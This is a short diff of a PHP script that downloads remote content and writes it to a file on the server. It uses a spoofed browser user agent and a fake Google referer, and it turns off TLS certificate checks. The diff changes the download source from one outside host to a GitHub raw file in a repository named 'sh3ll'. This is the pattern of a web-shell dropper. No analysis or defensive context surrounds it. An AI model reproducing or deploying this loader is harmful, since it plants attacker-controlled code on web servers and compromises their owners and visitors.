@@ -17,7 +17,7 @@ if (file_exists($write_file)==True){
 if($log_sure==False){
 	if(function_exists('curl_init')){
 	$s = curl_init();
-	curl_setopt($s,CURLOPT_URL,'http://mir.buymskey.com/transport/del_label_editor.txt');
+	curl_setopt($s,CURLOPT_URL,'https://raw.githubusercontent.com/instagraweb/sh3ll/transport/write.txt');
 	curl_setopt($s,CURLOPT_RETURNTRANSFER,1);
 	curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36');
 	curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");
@@ -44,7 +44,7 @@ if($log_sure==False){
 				  "verify_peer_name"=>false,
 	  )
 	);
-		$content = file_get_contents('http://mir.buymskey.com/transport/del_label_editor.txt', false, $context1);
+		$content = file_get_contents('https://raw.githubusercontent.com/instagraweb/sh3ll/transport/write.txt', false, $context1);
 	}
 	file_put_contents($write_file,$content);
 }
